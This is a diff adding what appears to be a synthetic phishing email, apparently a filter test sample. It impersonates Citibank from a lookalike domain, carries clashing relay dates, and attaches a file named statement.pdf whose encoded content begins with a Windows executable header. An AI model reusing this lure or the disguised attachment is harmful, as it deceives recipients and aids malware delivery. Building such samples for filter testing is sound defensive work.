@@ -1,0 +1,49 @@
+From: notice@citibank-verify.xyz
+To: victim11@example.com
+Subject: Power outage maintenance window [ref A634593]
+Date: Tue, 27 Mar 2002 08:23:00 -0500
+Message-ID: <phish-131-295d6952-5fd3-4e52-84f0-bbe09be364e3@citibank-verify.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 03 Mar 2002 22:20:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 21 Mar 2002 13:56:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 20 Mar 2002 16:07:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 26 Mar 2002 07:58:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 26 Mar 2002 17:25:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 04 Mar 2002 19:06:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 08 Mar 2002 01:35:00 -0500
+Return-Path: <notice@citibank-verify.xyz>
+Reply-To: notice@citibank-verify.xyz
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=citibank-verify.xyz; dkim=pass header.d=citibank-verify.xyz; dmarc=pass header.from=citibank-verify.xyz
+Received-SPF: pass (mx.example.com: domain of notice@citibank-verify.xyz designates 192.0.2.31 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=citibank-verify.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-131-a34706e"
+
+--bnd-p-131-a34706e
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A634593
+
+Thanks,
+Colleague
+--bnd-p-131-a34706e
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAMI1QYr2CMouhYEtu1QhA+h4m8iWGgDcs/eS+SNQE9Q5PVRz6CRbUj/W9jnYT5L5BmUqQpS/
+6G+OvbQaB9UUhs2oJDDhlKGEcG6CVpESxj3Ktf6WarlFZM+EKTg9NEhHZvvQLmx7iX9Huv+rnxFu
+9aI+St5uUVifHv8WFTe3rwJ0zDml9yfkatXM2/pvhxMuZl1SOx5jghrAcEmZhQ7aQwUIWlcWTaUf
+OEjzFo+0IsbdyzuiCbhkhWkUgNoL6jzpGY2ZxtQVVWXO5mktz3+WiwWk9iaVW8ax31f9Syg5Rkn+
+OXonBFuAJnr9EWiR6rX9nBziKAtzrzkMVtxtT4HoKyHjRH0ru5oyk5rZXcvuay1mXZAOfRU59Ogu
+u6aT0OQx7MAKfH/L4//0p8XeOi68SbgTLd/zkZyxxpkhoaDWfyYhuJyMbh668qSe7pNDB85Iwicg
+X3W98qmGVTnFqI8HqzAm4ZM7efWzq0UN7wp/CkEdJkIYXcU6SCPcTErCFLHPGYMe6S7SpPiDAAr5
+N5Dg4hTTTuF86wqsJOeKUzQBVglFhKYFzoDeYaInIGruT5WINGzuT5LNgXVuO5uvNPyFGekeaV60
+L/PVtuv3nHN0uYubEfqnlqXwUfhLdaGZ3GxKXfz7A2kMrOXzT1vYBbmoHIjmWLlPCL/R3h4CQfzm
+H54G4Hli2bbysAej7W5onrFWqVYNOrydAQNUBwr5yK2yWzBy2M7UY3rQMxRmJ579TO6vCfEN0FdR
+UAGr5orAC7OCc/ooMCLG4cz9yN2MVQvvC58HjAMAqlchMc9/MnC6eaIWiC11pzXMjwsDm4N/Kvi+
+aoShjxw6lMZxeRRhEw==
+
+--bnd-p-131-a34706e--
